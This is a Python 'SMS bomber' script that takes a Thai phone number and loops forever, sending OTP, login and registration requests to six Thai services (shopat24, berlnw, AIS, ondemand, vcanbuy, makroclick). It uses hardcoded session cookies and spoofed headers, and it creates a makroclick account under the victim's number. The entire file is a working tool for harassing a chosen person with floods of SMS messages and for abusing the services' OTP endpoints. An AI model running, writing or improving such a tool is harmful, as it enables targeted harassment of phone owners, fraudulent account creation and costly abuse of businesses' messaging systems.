import re
import os, sys, time, requests, random
import colorama
from colorama import Fore
from requests import Session
from re import search
os.system("clear")
print("\033[1;96mBY: AONKY")
print("")
phone = input("\033[1;93mPhone : +66\033[1;93m")
print("")
while True:

# 1 API
    try:
        session = Session()
        token = search("""<input type="hidden" name="_csrf" value="(.*)" />""",session.get("https://www.shopat24.com/register/").text).group(1)
        session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": token}, data={"phoneNumber": "0"+phone})
        print('\033[1;93m[*] \033[1;96mshopat24  \033[1;97mทำงาน !')

    except:

        pass
        
# 2 API
    try:
        headers={
            "Host": "www.berlnw.com",
            "Connection": "keep-alive",
            "Content-Length": "28",
            "Cache-Control": "max-age=0",
            "sec-ch-ua-mobile": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://www.berlnw.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://www.berlnw.com/myaccount",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "th-TH,th;q=0.9,en;q=0.8",
            "Cookie": "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"
            }
        requests.post("https://www.berlnw.com/reservelogin",headers=headers,data={"p_myreserve": "0"+phone})
        print('\033[1;93m[*] \033[1;96mberlnw  \033[1;97mทำงาน !')

    except:

        pass
        
# 3 API
    try:
        headers={
            "Host": "srfng.ais.co.th",
            "Connection": "keep-alive",
            "Content-Length": "67",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent":
            "Mozilla/5.0 (Linux; Android 9.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/5.0 Chrome/85.0.4183.127 Mobile Safari/537.30",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://srfng.ais.co.th",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://srfng.ais.co.th/8WXNShEVNCGn0o3%2BN6pPqiW5KfoLSNBvVqkqoQCl%2Bc4%3D?channel=webview&redirectURL=http%3A%2F%2Fakdev.vidnt.com&httpGenerate=generated",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "_chunk=1; ol3-0=po2YOaPtZc%252BHZHeVG7D7ZG%252BLV3UUNnejYANfRIc2aJod7cBWn4witm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545pslib3M%252FI2DYESmolC484IfK0uXD5D0rC%252Fo5%252FO%252BMvAmKevq9L6vW8pFbvG%252B5q%252BBInKvYPJ%252BOxCyzMixWbOUnOW4axJtZp3grN474ew9v4UFkdU8VUGoXKVhldzaK9%252BxYuJBdY2Jfzqf%252FsVIYv3uE4RmGzzoeCrQ7QXZm0uH6t3j1yF63KOQX4QwOmpG526ym0Sh%252BXLWQFhxnbuquuA8N7cumFvTTi7oWHt4W8mJQ4IN1GvS0iHlBQHgvnEkjGRlCtB%252FJ07aNkfBWlLrwb1zgQI88OkOrtTDDUdsIUSVdy7r5pOILz6rcT8kC%252FGqneTshPK9RF4PHxrBSDIPlQIVXJI6dxsiAr5H3UfAAa5FsfN8samV5qyQTgm3s9SC4w83uM1twiFJtarImPcx41vDFL7NF4yy7Ej7eSY%252FFyqLQuoCKDPhxlyOaH8mRoseOkpdQI0Bp4z75t0NlP%252B4YIV4EKmRueIktZmOk5c0I1SLC3bZ240Wshg7rbP6IgtwFEzWrOoIAGpfWHDjYjI8oiMpQX98aBtbtZA9sKvIDrY%252FdQqDsP4vDSPy3n1zb8pXhqaKLkDaAWih%252Ba6BX3FkEdn4fPrzZrNPfuHRC3hfSV51Jz4t3RxTPUlOS8goU8VSmQF%252F9wQEaLAkVR3F4sGzn1GH1fesp46wBbSOSkWNCEIu%252F%252B1VTElnOqnPSntHsUmow7jMst3uCb7Z9mNj%252Bo4RQM0oEuf39FLtPgIWMfYBXSEQXOXUeO2%252BYXI9OUFORSQBJy1kZcTPw2gjR4ZYrkaWKgqCo5jtIclLeDiLqzdBKYjupRC3%252BFXgL0SDchuE%252BD3XaNJ1YH2SVg0UzxbOIg6aIBxcIhakpSZw2w0jjPL1c1YG%252BAgVvT%252BeNL%252FzHr%252FeiqQkFjNI%252F64fvurU75Qy53GSlOBBvQTMhg0q11qYi4QMaxf2V%252FQ1TY3QLnfXiYKCq60Gh9gSACyjrf8thXVYUYheRWz2jM%252BotOvz%252FZwIbXf4SPGR71PK7X%252F2a30w01XgOvYf9dxC%252F9pWn4yNxgl%252BPhoIXK%252Fj%252FQRofkDIdzr1VJ0%252Bq6aX66IuSuytQAwWsoB"
            }
        requests.post("https://srfng.ais.co.th/login/sendOneTimePW", data={"msisdn": "66"+phone},headers=headers)
        print('\033[1;93m[*] \033[1;96mAisplay  \033[1;97mทำงาน !')

    except:

        pass

# 4 API
    try:
        requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": "0"+phone})
        print('\033[1;93m[*] \033[1;96mondemand  \033[1;97mทำงาน !')

    except:

        pass
        
# 5 API
    try:
        requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
        print('\033[1;93m[*] \033[1;96mvcanbuy  \033[1;97mทำงาน !')

    except:

        pass
        
# 6 API
    try:
        requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": "0"+phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
        print('\033[1;93m[*] \033[1;96mmakroclick  \033[1;97mทำงาน !')

    except:

        pass
